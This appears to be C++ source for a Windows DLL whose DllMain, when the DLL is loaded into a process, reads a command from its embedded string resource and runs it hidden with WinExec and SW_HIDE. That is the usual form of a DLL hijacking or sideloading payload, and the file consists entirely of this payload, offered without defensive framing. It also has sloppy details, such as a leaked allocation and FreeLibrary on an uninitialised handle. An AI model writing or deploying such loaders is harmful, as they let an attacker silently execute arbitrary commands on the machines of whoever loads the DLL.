#include <windows.h>
#include <tchar.h>
#include "resource.h"


// LoadString() for linker
#pragma comment(lib,"User32.lib")

#define MAX_ENV_SIZE 32767


BOOL WINAPI DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    static HINSTANCE hL;
    LPWSTR pCMD = new WCHAR[MAX_ENV_SIZE];
    char pACMD[MAX_ENV_SIZE]; 
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
      
        LoadString(hModule, IDS_CMD101, pCMD, MAX_ENV_SIZE);
        WideCharToMultiByte(CP_ACP, 0, pCMD, wcslen(pCMD), pACMD, MAX_ENV_SIZE, NULL, NULL);
        WinExec(pACMD, SW_HIDE);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        FreeLibrary(hL);
        break;
    }
    return TRUE;
}
